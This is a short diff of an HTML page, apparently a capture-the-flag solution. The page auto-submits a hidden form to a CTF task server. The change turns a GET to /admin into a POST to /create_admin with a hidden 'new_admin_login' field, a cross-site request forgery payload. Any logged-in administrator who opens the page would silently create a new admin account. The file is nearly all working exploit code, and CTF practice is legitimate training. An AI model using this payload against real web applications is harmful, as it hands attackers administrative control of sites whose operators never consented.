@@ -1,7 +1,9 @@
 <!DOCTYPE html>
 <html>
 <body>
-<form action="http://tasks.goidactf.ru:20448/admin" method="GET"></form>
+<form action="http://tasks.goidactf.ru:20448/create_admin" method="POST">
+  <input type="hidden" name="new_admin_login" value="putin">
+</form>
 <script>
 document.forms[0].submit();
 </script>
